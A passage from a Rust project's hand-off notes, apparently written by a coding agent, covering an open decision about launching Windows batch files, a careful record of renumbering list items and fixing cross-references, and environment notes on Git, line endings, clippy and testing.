   and `npm.cmd` is on `PATH`; a `.cmd` or `.bat` named *with its extension*
   **does** start, and the process that runs is `cmd.exe`, which Windows supplies
   and SURE never names; a `.ps1` does not start at all. So the decision cuts both
   ways and neither arm is free — refusing to name a batch file makes four common
   Windows tools unrunnable, and permitting it means SURE hands project-controlled
   shell text to an interpreter. `crates/sure-core/src/process/error.rs:81-83`
   states whose question it is rather than deciding it, and this item exists so
   that the `P3` tasks running into it do not each settle it quietly in passing.
   **`P3-T004` and `P3-T005` have both been accepted without settling it**: both
   classify a batch file rather than deciding whether a caller may name one, and
   `progress/DECISIONS.md` records the question as still open in `P3-T001`'s
   section and again in `P3-T003`'s. That is the outcome this item was written to
   produce rather than a lapse in either. **`P3-T006` and `P3-T007` have now both
   been accepted without settling it too**, which makes five tasks that have met
   the question and five that have left it open; `P3-T007`'s part is recorded in
   `progress/DECISIONS.md` and in "What `P3-T007` added" above.
   **`P3-T008` was then accepted and never reached it at all** — the container
   adapter builds no command and names no program, so the question does not arise
   in it — and the sentence that said it would is the second wrong prediction about
   this same task in this file. The first was corrected one acceptance earlier, at
   `P3-T006`'s, where the same claim was checked against `tasks/tasks.json` and
   found false; **it was then re-written here in a different item, in the same
   wrong form, one acceptance later.** The lesson is the one this file keeps
   relearning: the correction was applied to the sentence in front of the reader
   and not to the belief that produced it, and a fact stored in one item's prose
   is not available to the next item that needs it. **What is measured now is that
   five tasks have met the question and left it open — `P3-T001`, `P3-T004`,
   `P3-T005`, `P3-T006`, `P3-T007` — and `P3-T008` is not a sixth.**
   **`P3-T009` is now accepted and it is not a sixth either, and the way it is not
   one is the first of its kind.** The prediction was not made here — *"whether
   `P3-T009` becomes a sixth is not written here as a prediction, because this file
   has now been wrong twice predicting exactly that about exactly this question"* —
   and the outcome is neither of the two forms the five above took. `P3-T009` is
   the first task since `P3-T007` whose subject matter starts commands at all, so
   the question is **live** in it in a way it never was in `P3-T008`; and `P3-T009`
   still did not settle it, because it never had to. `Supervisor::start` takes an
   `AdmittedCommand<'_>` and nothing else, and `safety::classify` never admits a
   batch file, **so the refusal is upstream of the supervisor and there is no code
   path in the task that could name one** — a bare `npm` is completed to `.exe` and
   not found, and `npm.cmd` never reaches `start`. **So the six tasks split three
   ways rather than two**: five decided nothing because there was a decision to
   make, `P3-T008` never reached the question, and `P3-T009` reached it and found it
   already answered by a door it does not own. The owner's decision is exactly as
   open as it was — what changed is that its consequence is now visible in a task
   whose whole job is starting things, which is a stronger statement of the
   question than another task declining to answer it.
   **This is not a defect to be fixed in the runner**: the completion rule is the
   operating system's and the interpreter is the operating system's doing, and the
   runner's part — that it never *builds* a command line for either — is already
   true.

**The item numbers in this list had rotted, and they are repaired here: there
were two `3.`s, three `4.`s and two `5.`s over nine items.** Each acceptance
prepends an item and nothing renumbers what follows it, so the duplicates
accumulated one task at a time and every individual step looked correct. **A
duplicate number is not cosmetic in a list whose items refer to each other by
number**: item 7 still read *"the same shape as `ComponentGraph` in item 3"*,
which was written when item 3 was `P2-T007` and which by this acceptance pointed
at `P2-T008` — a reader following it would have been sent to the wrong task, and
the sentence would have read as though it had been checked against the list it
sits in. It was changed to item 8, which was `P2-T007` then and has moved twice
since — it read **item 11** at `P3-T003`'s acceptance and reads **item 13** at
`P3-T005`'s, and it is `P2-T007` at both. Those two numbers are dated rather than
kept current, which is the rule the `P3-T003` acceptance set: a sentence that says
"item 11 now" is wrong one acceptance later, and the fix is the date, not another
patch. Each paragraph below records one move. This is the third instance of one
shape found in this single pass: a list that is wrong in a way that reads as
complete — the missing task entries above, the stale commit ordering in the
header, and now the numbering. All three were found by checking the file against
something outside it (`progress/state.json`, `git show --stat`, and the list
itself) rather than by reading it, which is the only method that has ever found
one.

**And `P3-T001`'s acceptance rotted that same reference again, with the
renumbering done by script — which is the part worth keeping.** The repair above
established the method: prepend the new item, then renumber every item below it.
That was done here by `target/tmp/renumber.py`, which found all eleven items,
renumbered them 1..11, and **verified the result was 1..n with no gap and no
repeat before writing it out**. The list is now correct and the reference was
still wrong, because **renumbering a list is not the same operation as
renumbering the references into it**: `P2-T007` moved from 8 to 9, and the
sentence pointing at it went on saying "item 8", which after the shift names the
`P2-T012` classification item instead. So the rule for the next acceptance is two
steps and not one — **renumber the items, then re-read every `item N` in the file
and check it still points where it did**, and the check that found this one was
`grep -n "item [0-9]"`, not a reading. A script that verifies its own output can
still leave the file inconsistent, because the thing it verified was not the
thing that was broken.

**`P3-T002`'s acceptance followed both steps, and the second one is what caught
its own mistake.** `target/tmp/renumber2.py` prepended the new item, renumbered
the rest to 1..13, re-read and rewrote the one `item N` reference
(`ComponentGraph` read **item 10** at that acceptance, and it was `P2-T007`), and verified
1..n with no gap before writing — **and the first run still produced a list with
two `P3-T001` items in it.** The script inserts a new item; it does not replace,
so the item it was written to rewrite stayed where it was and the list read
`1. P3-T002 / 2. P3-T001 / 3. P3-T001 / 4. P2-T011`. The numbering check passed on
that file, because `1..13` is exactly what a list with a duplicate *content* and
correct numbers looks like; what found it was `grep -n "^[0-9]\+\. \*\*"` over
the section, which prints the items themselves rather than their numbers. The
duplicate was deleted and the tail renumbered again, and the check was run a
second time. **So the rule gained a third step, and it is the one that would have
caught all three of this file's numbering failures: after renumbering, print the
items and read them.** A sequence of numbers is not a sequence of items, which is
the same sentence as "a multiset is consistent with the attribution and cannot
establish it", arriving in a list.

The third step is also where the write itself was fixed: `renumber2.py` passes
`newline=""`, because `Path.write_text` on Windows translates every `\n` to
`\r\n` silently and the earlier script did not — which would have turned every
line of this file into CRLF in the working tree while `git diff` stayed quiet
under `.gitattributes`' `eol=lf`. The check is one command
(`python -c "print(open('progress/HANDOFF.md','rb').read().count(b'\r\n'))"`) and
it now prints 0.

**`P3-T003`'s acceptance ran all three steps and they all held, which is the first
time that has happened — and the reason is written down rather than the
outcome.** `target/tmp/renumber3.py` inserts the new item into the **item block**
rather than into the section (the mistake `renumber2.py` made was `insert`, which
cannot replace), renumbers 1..14, verifies the sequence, and **prints the first
line of every item** — which read
`1. P3-T003 / 2. P3-T002 / 3. P3-T001 / 4. P2-T011 …`, fourteen distinct items.
The one live `item N` reference in the file moved **10 → 11** and was re-read
against the printed list after the renumbering, not before it, and the two
historical mentions were reworded to say which acceptance they were true at — a
sentence that says "item 10 now" is wrong one acceptance later, and the fix is to
date it rather than to keep re-patching it. The write passes `newline=""` and the
CRLF count is 0 after it.

**`P3-T005`'s acceptance is the first to prepend two items, and its printing step
was itself wrong.** `P3-T004`'s acceptance never prepended its item, so the list
was one short and this acceptance owed two: `target/tmp/renumber4.py` takes a
*file* of new items rather than one string, and it renumbered 1..16 with the
sequence verified before the write and the CRLF count 0 after it. **What it got
wrong is the third step, which is the one that has no substitute.**
`renumber4.py`'s print loop enumerated the rebuilt *lines* and kept only the ones
that start an item, so it printed sixteen labels that were line offsets —
`1, 24, 38, 52, 65, …` — while the file's own numbers were `1..16`. Sixteen
items, sixteen labels, and not one label was an item's number. **That is the
defect this very paragraph records, arriving inside the tool written to prevent
it**: a sequence of numbers is not a sequence of items, and a print step whose
purpose is to be read by a human has to number the items. So the reader is
`target/tmp/printitems.py`, which reads the file back rather than trusting
anything the writer returned, uses the number the file carries, refuses if they
are not `1..n`, and **refuses if two items share a first line** — the
duplicate-content failure `renumber2.py` produced while its arithmetic check
passed. Its output is the sixteen distinct items, which is what was read.

The live references moved by two and were re-read against the printed list after
the renumbering, not before it: the `ComponentGraph` reference went **11 → 13**
and the batch-file decision went **14 → 16**. One sentence in the narrative above
said "it reads **item 11** now", which is the shape `P3-T003`'s acceptance
already ruled against — it is dated now, and reads *item 11 at `P3-T003`'s
acceptance and item 13 at `P3-T005`'s, and `P2-T007` at both*.

**`P3-T006`'s acceptance moved the same two references by one, and the tool was
this time checked before it ran rather than after.** The prepend used
`target/tmp/renumber5.py`, which is `renumber4.py` with exactly three textual
changes — the expected new-item count `2 → 1`, one message, and the `+2` in the
reporting line — and the changes were **read as a diff rather than trusted to the
copy**: `difflib.unified_diff` over the two files prints four changed lines and
nothing else, which is the same discipline `P3-T005`'s mutation driver was copied
under. It renumbered 1..17 with the sequence verified before the write and the
CRLF count 0 after it, and the read-back is `printitems.py`, which reads the file
rather than the writer's return value. The live references went
`ComponentGraph` **13 → 14** and the batch-file decision **16 → 17**, and both
were re-read against the printed list **after** the renumbering. **One thing this
acceptance did differently and should keep doing: the new item 1's claim about
which tasks meet the `.cmd`/`.bat` question was written, then checked against
`tasks/tasks.json`, and it was wrong** — it named `P3-T008`, whose acceptance is
about Docker/Podman mounts and the wording of an isolation claim, and the task
that actually walks into the question is `P3-T007`, whose acceptance is *"project-
controlled executable code is not launched in inspect-only mode"*. The correction
is in the item, and the sentence that names `P3-T008` now says why it is **not**
that task, so the next reader does not re-derive it.
**And the line-ending check on this acceptance reported 7379 CRs where there are
none.** `grep -c $'\r' progress/HANDOFF.md` answered `7379`, which is the file's
line count rather than its CR count; the byte count is
`open(p,'rb').read().count(b'\r\n') == 0`. It was caught by not believing a
green-looking number that contradicted the writer's own report — `renumber5.py`
prints `CRLF count: 0` after every write — and `renumber2.py`'s docstring already
records why that print exists. **A check that agrees with the thing it is checking
is worth nothing; this one disagreed, and the disagreement is what was read.**

**`P3-T007`'s acceptance prepended one item and moved both live references by one,
and the two things it did differently are the two worth keeping.** The prepend used
`target/tmp/renumber5.py` **unmodified**, which is the first time a renumbering
tool has been reused rather than copied: its docstring already required exactly one
new item and it already moved everything by `+1`, so this acceptance's only change
to the method was to the *input*. It renumbered 1..18 with the sequence verified
before the write, the CRLF count is 0 after it, and the read-back is
`printitems.py`, which reads the file rather than the writer's return value and
refused nothing — eighteen items, no gap, no repeat, no two sharing a first line.
The live references went `ComponentGraph` **14 → 15** and the batch-file decision
**17 → 18**, and both were re-read against the printed list **after** the
renumbering. **The first difference is that the tool refused the first input and
the refusal was correct**: `p3t007-item.md` was written without its `1. ` prefix,
so `split_items` found zero items and the script exited
`expected one new item, found 0` **without touching the file**. A tool that
validates its input is worth more than a run that happens to work, and this is the
first acceptance where the tool caught the author rather than the other way round.
**The second is that the reference check was done with `grep -n "item [0-9]"`
before the renumbering as well as after it**, which is what made the count
knowable: **fifteen lines in this file mention an item number, and twelve of them
are dated narrative** — the paragraphs recording what earlier acceptances moved —
so patching all of them would have been the error. Three are live: two that this
acceptance moved (`ComponentGraph` 14 → 15 and the batch-file decision 17 → 18) and
one in "What `P3-T007` added" above, which was written at 18 rather than moved to
it. **A grep that finds fifteen and needs three is the useful shape here**, because
the risk is not missing a reference, it is rewriting a sentence that is supposed to
say what it said at an earlier acceptance.

**`P3-T008`'s acceptance prepended one item, moved three live references by one,
and for the first time one of them was not a moved number but a sentence that had
become false.** The prepend used `target/tmp/renumber5.py` **unmodified for the
second acceptance running** — its docstring already required exactly one new item
and already moved everything by `+1`, so this acceptance's only change was again
to the input. It renumbered 1..19 with the sequence verified before the write, the
CRLF count is 0 after it, and the read-back is `printitems.py`, which reads the
file rather than the writer's return value and refused nothing — nineteen items,
no gap, no repeat, no two sharing a first line. The reference check was
`grep -n "item [0-9]"` before and after, which found **fifteen lines, the same
fifteen as the previous acceptance**, of which **three are live** and twelve are
dated narrative. The `ComponentGraph` reference went **15 → 16** and the batch-file
decision **18 → 19**, both re-read against the printed list after the renumbering
rather than before it.

**The third live reference was a different kind of error, and it is the one worth
keeping.** The other two are numbers that move; the third was the sentence in
item 13 reading *"The next two to reach it are `P3-T008` and `P3-T009`"* — a
**prediction** that this acceptance proved false, because `P3-T008` is a container
adapter that builds no `Command` and names no program, so the `.cmd`/`.bat`
question never arises in it. **And this is the second time this file has made that
same wrong prediction about that same task**: at `P3-T006`'s acceptance the claim
was checked against `tasks/tasks.json`, found wrong, and corrected — and the
correction was written into the item that was being edited at the time, not into
the belief. One acceptance later the wrong form was written again, in a different
item, by the same author applying the same reasoning. **A grep over `item [0-9]`
finds references that are numerically stale; nothing finds a committed paragraph
that is *propositionally* stale**, and this acceptance found one only because the
task it named had been finished by the time the item was re-read. The correction
is in item 26 and it says outright that the file has been wrong twice, so the next
reader has the failure rather than the tidy version of it. **The general form is
the one this file keeps arriving at**: a fact stored in one item's prose is not
available to the next item that needs it, which is why the counts that matter are
put in one place and re-read from `taskctl status` rather than restated.

**Item 13 was rewritten rather than patched, and that is the convention it now
states about itself.** Its title changed from *"the list is 14 long"* to *"The
READY list is 13 long, and the next task is no longer a choice"*, and the previous
reading is named inside it in the past tense rather than deleted — because the
previous reading was right about `P3-T008` and the one before it was wrong, and a
reader who cannot see both cannot see what made the difference. That difference is
one command: the right version was read out of `tasks/tasks.json`.

**`P3-T009`'s acceptance prepended one item, moved five live references by one, and
took its measurement off the committed file rather than off the previous
paragraph — which is what made the count knowable.** The prepend used
`target/tmp/renumber5.py` **unmodified for the third acceptance running** — its
docstring already required exactly one new item and already moved everything by
`+1`, so this acceptance's only change was again to the input. It renumbered 1..20
with the sequence verified before the write, the CRLF count is 0 after it, and the
read-back is `printitems.py`, which reads the file rather than the writer's return
value and refused nothing — twenty items, no gap, no repeat, no two sharing a
first line. The reference check was `grep -n "item [0-9]"` run **over
`git show HEAD:progress/HANDOFF.md` and over the working file, listed side by
side**, because the committed file is the only place this acceptance's own
starting numbering can still be read: **nineteen lines matched at HEAD and five of
them were live**, the other fourteen being the dated narrative the previous four
acceptances wrote about their own moves. The five live ones were read against the
printed list and each moved by one — the batch-file decision **19 → 20** in three
places (the `P3-T007` section, the READY-list item, and the `.cmd`/`.bat`
correction), the `ComponentGraph` reference **16 → 17**, and the READY-list
reference **13 → 14**.

**The count did not carry from the previous acceptance, and the reason is
measurable rather than a matter of care.** `P3-T008`'s paragraph records *"fifteen
lines ... of which three are live"*, and that is exactly what the file it started
from carries: `git show 1f403d8^:progress/HANDOFF.md` matches `item [0-9]` on
fifteen lines, and the three live ones are the batch-file decision twice (at 18)
and the `ComponentGraph` reference (at 15). **The file that acceptance left behind
carries nineteen and five**, so it added four: two live references it wrote into
the batch-file item at the numbers that were correct *after* its own renumbering,
and the two lines of its own narrative recording the moves. **A count of a file is
a count of the file at the moment it was taken, and every acceptance writes into
the file it just counted** — which is the same reason the READY list is read off
`taskctl status` rather than off the paragraph that last described it.

**And the fifth move found two numbers standing for one item, which nothing but
the printed list could have resolved.** Line 526 is new in this acceptance — the
READY item's own arithmetic, `13 - 1 + 2 = 14` — and it reads *"the same
instruction item 14 below gives"*, while the line this acceptance moved reads *"the
same instruction item 13 gives about the READY list"*. **The same idiom, the same
target, a different number, and each was correct when it was written**: the 13 was
written at `P3-T008`'s acceptance where 13 was the READY item, and the 14 was
written here where 14 is. What separates them is not which is older but which
survived this acceptance's renumbering, and **a grep cannot say, because a grep
finds references and does not know what they point at** — `printitems.py` prints
item 14's first line, *"The READY list is 13 long, and the next task is no longer a
choice."*, and that is the whole of the evidence. Both read 14 as committed.
**Two numbers for one item is worse than a stale number**, because the stale one
reads as stale and the contradiction reads as something somebody decided.


**What `P2-T002` left for later, and what `P2-T003` then did with it.**
`P2-T002` left the Git fingerprint asked for explicitly, by a caller that had
already decided the project is in a repository, with nothing making that decision
for it. `P2-T003` wrote the decision — `project_fingerprint` in `choose.rs` — and
that is as far as it goes: **nothing calls `project_fingerprint` yet either.**
So `FINGERPRINTING.md`'s coverage rule — *a file is part of the fingerprint if
and only if a check could read it* — and the dispatch rule above it are, like
`PROJECT_DISCOVERY.md`'s guarantees, properties of the modules and of their tests
until the check pipeline is the first real consumer.

The `#[cfg(unix)]` tests have still not run on this machine and never will; they
run on the macOS and Linux CI jobs. Four were read out of run `34839532984` by
name rather than inferred from the job's colour, and `P2-T003` added two more —
both read out of run `34845282962` **on both Unix jobs** by name, in the section
above. `P3-T002` added none that are Unix-only, and **`P3-T003` added three whose
gates are narrower than `unix`**: two `#[cfg(unix)]` script tests (read out of
`34930744061` on both Unix jobs by name) and one `#[cfg(target_os = "linux")]`
test, which is the first test on this branch whose gate is a single Unix platform
— and the macOS answer to its question got a test of its own beside it rather than
a comment. See the top of this file.

`taskctl accept` takes `--note`, not `--evidence`; `--evidence` is silently
ignored, which is how the earliest tasks came to record an empty note.

## Environment notes for the next session

- **Run `cargo fmt --all` before the gate set, not after.** New files written by
  hand are not rustfmt-shaped (let-else bodies, long `assert!` messages) and
  `--check` fails on them. `P1-T007`'s commit was blocked once by this.
- **Do not read or write repository sources with Python's default encoding.** It
  is `gbk` on this machine, and a source file with a `—` in it fails with
  `UnicodeDecodeError: 'gbk' codec can't decode byte 0x94`. Pass
  `encoding='utf-8'` and `newline='\n'`.
- **`Path.write_text` silently converts every line ending, and `.gitattributes`
  says this repository is `eol=lf`.** `p.read_text()` strips `\r\n` to `\n` and
  `p.write_text()` puts back `os.linesep`, so on Windows one round trip rewrites
  a whole file as CRLF **with no error and no visible symptom in the script**.
  `P3-T001`'s acceptance hit this on `progress/HANDOFF.md` while renumbering a
  list in it. What catches it is `git diff --stat` reporting thousands of changed
  lines for a change of a few, and `diff` printing `1,5112c1,5125` — both files
  "entirely different" — because an LF file and a CRLF file share no lines. The
  fix is `p.write_bytes(text.replace('\r\n', '\n').encode('utf-8'))`, or
  `open(p, 'w', encoding='utf-8', newline='\n')`. **The committed blob is
  unaffected either way** (git normalises on the way in and says so in a warning),
  so this is a working-tree defect rather than a history one — which is exactly
  why it is easy to leave behind.
- **Parse the command line with `clap::Parser::try_parse`, never `parse`.**
  `parse` calls `process::exit` itself, which would put one row of SURE's
  documented status table in a library's hands. `status_of` maps clap's exit code
  onto `report::exit`; `--help` and `--version` are clap's 0 and become SURE's 0.
- **`arg_required_else_help = true` makes a bare `sure` exit 2, not 0.** That is
  deliberate: it did nothing, so status 0 would let a script that invoked the
  wrong thing read it as a clean run.
- **`env!("CARGO_BIN_EXE_sure")` gives an integration test the built binary**,
  and an integration test may use its package's `[dependencies]` — which is why
  `tests/cli_contract.rs` can `serde_json::from_str` the frame without a
  dev-dependency of its own.
- Clippy's `unnecessary_map_on_constructor` is enforced by `-D warnings`:
  `Some(x).map(Some)` is an error, `Some(Some(x))` is not.
- **A mutation can leave the responsible test green because the test and the
  code share a source of truth.** Changing what `Report::command()` returns does
  not fail `report.rs`'s own frame test, which compares the frame against
  `report.command()`; the integration test that reads a real process's stdout is
  what catches it. When a test asserts `f(x) == g(x)` and both sides call the
  same function, check which test is actually load-bearing before trusting it.
- **A mutation anchor must be copied out of the file, not out of memory.**
  `rustfmt` reflows arms and arguments, so the text a mutation replaces is often
  not the text that was written. A script that finds its anchor zero times
  reports SKIP and has tested nothing; both mutation scripts print SKIP loudly
  for that reason. `P1-T010`'s first CLI mutation hit exactly this.
- **A mutation inside a test's stated range is evidence about the test; one
  outside it is not.** `P1-T010`'s first reader mutation accepted a version
  above the range the test loops over, and escaped — correctly. Writing the
  mutation to land between two values the test covers is what turned it into
  evidence.
- **`clap` answers a typed argument's parse failure with exit 2**, which is
  `sure protocol --speaks latest` → "you typed it wrong" rather than "SURE
  cannot talk to that". `an_unknown_command_or_flag_is_a_wrong_command_line`
  pins it; the distinction matters because 3 reads as a version that exists.
- **The PowerShell here-string cannot carry a git commit message.** Use the Bash
  tool for `git commit -F - <<'EOF'`; PowerShell rejects the redirection.
  (`@'…'@` works in PowerShell but the closing `'@` must be at column 0.)
- **Every integration test file needs
  `#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]` at the
  top.** The workspace lints are `warn` but the gate runs `-D warnings`, so a new
  test file fails clippy until it carries the opt-out. `cargo fmt --all` will
  place it correctly if the file starts with it.
- **A directory junction reports `is_symlink() == true, is_dir() == false`** from
  `DirEntry::file_type()`. Checked with a probe, not assumed. This is why the
  walk matches the symlink arm first: put it after `is_dir()`/`is_file()` and
  every junction on Windows falls into the `Some(_)` arm as a `SpecialFile`, and
  the "never followed" rule still *looks* enforced because nothing is followed.
- **`mklink /J` (junction, no admin needed) parses forward slashes in its
  arguments as its own switches.** Build the argument vector with backslashes —
  `r"target\tmp\..."`, not `"target/tmp/..."` — or it fails with a usage error in
  the console's own code page. It is also invoked through `cmd /C`, so a Rust
  string you pass it must be a raw string or the `\t` is a tab.
- **Win32 strips trailing spaces and dots from the last path component before the
  file is created.** A fixture asking for `"padded "` produces `padded` on Windows
  and `padded ` on Unix; `a_trailing_space_is_not_a_character_on_windows` is the
  test that pins the difference, so the omission elsewhere is a fact with a test
  rather than a hole. An interior or leading space is kept.
- **A file name that is not valid Unicode *is* constructible on Windows**:
  `std::os::windows::ffi::OsStringExt::from_wide(&[0xD800])` gives an unpaired
  surrogate, NTFS accepts it, and `to_string_lossy` renders it U+FFFD. On Unix it
  is `OsStringExt::from_vec(vec![0xED, 0xA0, 0x80])`. APFS is believed to refuse
  it; that belief is recorded in `PROJECT_DISCOVERY.md` rather than relied on
  silently.
- **Sorting by `to_string_lossy()` and sorting by `OsString` agree for every pair
  of names that both render faithfully, and differ for exactly one pair**: a name
  that cannot be rendered (lossy U+FFFD) against a name whose code points are all
  above U+FFFD. `\u{D800}` vs `\u{E000}` sort one way by bytes and the other way
  as text. A mutation to the text sort therefore escapes every test that uses
  ordinary names — which is why the invalid-name test is the one that has to
  exist.
- **`git status --relative` is unusable on this machine's Git (2.55.0.windows.3):
  for a repository with changes it prints nothing at all and exits 0.** The first
  version of `Git::STATUS_ARGUMENTS` used it, and the failure mode is the worst
  one available — an empty change list, which is indistinguishable from a clean
  tree, so a dirty project would have fingerprinted as clean and every check
  keyed to it would have gone green. It was caught by
  `a_dirty_project_fingerprints_differently_from_a_clean_one`, not by reading the
  flag list. The replacement is `-- .` plus a separate `git rev-parse
  --show-prefix`, stripped with `Path::strip_prefix` (a string comparison would
  confuse a project in `app/` with a sibling `app-old/`). The flag is now
  forbidden by a comment in the module and by a mutation in `mutate6.py`;
  `FINGERPRINTING.md` states the prohibition. **No other Git flag is used here
  without having been run against a real repository first.**
- **A nested `git init` inside a fixture is reported as one untracked directory**
  — `? inner/` — even under `--untracked-files=all`, verified by hand. That is
  what makes the walk in `Reader::tree` reachable and what a test had to
  construct; without it the whole nested-checkout path is dead code that looks
  alive.
- **This machine has no Rust toolchain available for the Unix tests, and that is
  CI's job rather than a local one.** Windows cannot create a symbolic link
  without Developer Mode or administrator rights (both probed, both absent), and
  the WSL Ubuntu that is installed here has Git 2.53.0 but **no `cargo`**.
  Installing one would be a 1–2 GB unilateral change to the owner's machine, and
  `.github/workflows/ci.yml` already runs `cargo test --workspace` on
  `ubuntu-latest` and `macos-latest` — which `RUST_DESIGN.md` names as the
  designed verification path for `#[cfg(unix)]` behaviour. As of run
  `34839532984` that path is **observed working**, not merely intended: the three
  `#[cfg(unix)]` fingerprint tests from `P2-T002` passed there, and the two
  case-rule tests in `paths/compare.rs` ran one per platform as designed.
- **`mkfifo` is how a test puts a pipe in a working tree**, and it is an external
  program rather than a `libc` call because the workspace is
  `unsafe_code = "forbid"`. It exists on both CI Unix images. A test that cannot
  create its fixture must **fail, not skip** — a skip that reads as a pass is the
  thing this repository keeps finding.
- **The two facts about Git and pipes, measured in WSL with Git 2.53.0 and worth
  not re-deriving.** A tracked path whose working-tree entry is replaced by a
  pipe **is** reported, as an ordinary modified file (`1 .M N... 100644 100644
  100644 …`), so it reaches `Reader::read`. An *untracked* pipe is **not** in
  `git status --porcelain=v2 -uall` output at all. Anything concluded from a
  pipe's absence from a fingerprint is concluded about Git first.
- **A throwaway `rustc -D warnings` file is the only local check available for a
  `#[cfg(unix)]` body**, and it is worth using: it catches a type or lint error
  (it was used for `Result::is_ok_and(ExitStatus::success)` and for an un-joined
  `thread::spawn`, and confirmed `JoinHandle` is not `#[must_use]`). It cannot
  catch a wrong *expectation* — that is what the runner is for. Compile the
  construct, not the code, and do not let it stand in for the run.
- **A "reads no file contents" guarantee can only be tested against the source.**
  `scanning_the_repository_does_not_open_any_file` greps the four `scan/*.rs`
  files for `File::open`, `fs::read(`, `fs::read_to_string`, `read_to_end`,
  `BufReader`, `read_link` and `canonicalize`. No run of the code demonstrates
  that a file was never opened. Adding `let _ = fs::read(...)` to the walk makes
  it fail, which was checked by mutation.
- **Rank a closed enum with a full `match` returning a number, not with a
  `bool` predicate.** `P1-T011`'s first `resolve` took
  `stronger: impl Fn(T) -> bool` (e.g. `|mode| mode == Standard`), which silently
  ranks every variant the predicate does not name as *weaker* — including
  `ProtectionMode::Custom`, a variant this release cannot produce but which
  exists in the enum. A `match` forces the question to be answered when a variant
  is added, and lets the unreachable ones be ranked in the safe direction with a
  comment saying so. **A predicate that answers `false` for an unhandled case is
  a default, and defaults are where false greens live.**
- **`execution.allow_network: true` and `allow_dependency_install: true` are
  `Contradiction`s unless `execution.mode` is non-`inspect_only`.** Any test
  fixture that sets either boolean must also set `mode: host_confirmed`, or it
  fails at parse time with a message about a setting that "could never take
  effect".
- Write repository files with LF endings. `core.autocrlf=true` plus
  `.gitattributes` (`* text=auto eol=lf`) means a Python `write_text` on Windows
  leaves CRLF in the working tree that shows as a phantom ` M` until
  `git add -A` re-hashes it. Write with `newline='\n'` or `write_bytes`.
- **`.gitattributes` and `git ls-files --eol` are the authority on line
  endings.** `grep -c $'\r'` gives a false positive on some files and a false
  negative on others; `store_packaging.rs` was `w/crlf` with zero `\r` bytes.
  Use `git ls-files --eol`.
- **`rusqlite` is a `dev-dependency` of `sure-core` as well as a real one**,
  which looks like a mistake and is not: `tests/store_concurrency.rs` holds the
  write lock from outside the store, and the lock is SQLite's, so the test has to
  take it with SQLite. `[dev-dependencies]` do not appear in
  `normal_edges()`, so this does not affect the crate-boundary test.
- **A spawned test child must be given `--exact <name> --ignored`, not a bare
  filter.** Without `--exact` a filter that is a prefix of another test's name
  runs that one too, and the child recurses into the parent's tests.
- **A cross-process contention test needs a barrier or it tests nothing.** See
  the two-bugs section above. The pattern that worked is a wall-clock moment
  passed in an environment variable and a spin loop in the child; Windows sleeps
  in ~15 ms steps, which is too coarse.
- The child's environment variable holds a path, a count and a time,
  newline-separated. Any other separator can appear in a path.
- `toml` 1.x parses a *document* into `toml::Table`, not `toml::Value`;
  `Value`'s `FromStr` reads a single value and fails on the second key.
- `variants!` `ALL` is a `&'static [Self]` slice, so iterate with
  `for &x in T::ALL` and use `.iter().copied()` where a value is needed. The
  macro is `#[macro_export]`ed, so `sure-core` reaches it as
  `sure_domain::variants::variants`.
- `serde_yaml_ng` error text is load-bearing for `config`'s diagnostics: it
  prepends a `parent.path: ` prefix, quotes field names in backticks and values
  in double quotes, and reports a repeated key with the *parent* path. The three
  shapes are pinned by `serde_error_shapes_are_what_this_classifier_expects`.
- YAML 1.2 (what `serde_yaml_ng` implements) does **not** read `yes`, `no`, `on`
  or `off` as booleans. `checks.existing_tests: yes` is a string, and the
  classifier turns that into "use one of: true, false".
- Repository test fixtures that need a writable scratch directory belong under
  `target/tmp/` (already git-ignored, same volume as the checkout). See
  `crates/sure-core/tests/config_loading.rs`.
- **…and a fixture under `target/tmp/` is inside this repository's working tree,
  which is a fact about the fixture and not about the test.** Any test whose case
  is "there is no repository here" needs `std::env::temp_dir()` instead. The
  `P2-T003` test named for that case was under `target/` and exercised the other
  branch for a whole acceptance run without anything going red; the mutation that
  changed the branch was MISSED, which is the only reason it was found.
- **Assert the premise with the tool that is not under test.** `git_prefix()` in
  `tests/fingerprint_content.rs` runs `git rev-parse --show-prefix` and asserts
  what it printed, so a test that intends to be "inside somebody else's
  repository" fails rather than quietly becoming a different test. Its first
  version compared `Some("inner/")` against `"inner/\n"` and the *reading* was
  wrong while the assertion was right — which is the good direction to be wrong
  in.
- **`Git::with_program(name)` is the only way to reach `GitUnavailable`**, and it
  needs the function that would use it to be `pub(crate)`: an integration test
  cannot call it. `choose.rs`'s `fingerprint_with` is `pub(crate)` for exactly
  this and its test lives in the module as a result. The rule generalises — when
  an outcome is decided by the *machine* rather than by the fixture, the test
  cannot be an integration test.
- Clippy's `derivable_impls` and `result_large_err` are enforced by
  `-D warnings`. `ConfigError` boxes its `ErrorKind` for the second reason; the
  non-derivable `Default` impls (`ExecutionConfig`, `ChecksConfig`) carry their
  reason in a comment.
- **An `f64` read out of JSON has no total order, so a type holding one must not
  derive `Eq`.** `ViolationKind::BelowMinimum` is why `Violation`,
  `ViolationKind` and `EnvelopeError` are `PartialEq` only; each carries a
  comment saying so. `assert_eq!` needs only `PartialEq`.
- **`DocumentKind::ALL` is a free const** (`sure_protocol::documents::ALL`), not
  an associated one, and `DocumentKind::FixtureExpectation` is deliberately not
  storable — `RecordKind::is_storable` is the predicate and `Store::append`
  refuses it with `StoreError::NotStorable`.
- The event schema has `additionalProperties: false`. A test fixture that needs
  to carry its own data must put it under `payload`, which is the only open
  object.
- **A raw string in Rust ends at the first `"#`.** `r#"{"$ref":"#/x"}"#` does
  not compile; write `r##"…"##`.
- Cross-target clippy needs the target installed. `x86_64-pc-windows-msvc` and
  `x86_64-unknown-linux-gnu` are; `aarch64-apple-darwin` is not, and asking for
  it fails with `E0463`.
- **MSVC builds without `cl.exe` on `PATH`.** The `cc` crate locates Visual
  Studio itself, so `rusqlite`'s `bundled` feature compiles SQLite 3.50.2 here
  with no environment setup. This was checked by building a probe, not argued.
- `jsonschema` was evaluated for `P1-T007` and **rejected**: it pulls
  `reqwest` + `rustls/aws-lc-rs` and roughly fifty transitive crates, which is
  the wrong shape for a local-first tool. Do not reintroduce it without reading
  `docs/architecture/PROTOCOL.md` §The validator, which records the two
  invariants the hand-written replacement must keep (an unsupported keyword is
  an error, not a skip; the schema is not treated as an annotation).

## External blockers

None. No task has been marked `block-external`. No credential or authorization
outside this machine has been needed yet.

### The second occurrence, and what two in a row does and does not establish

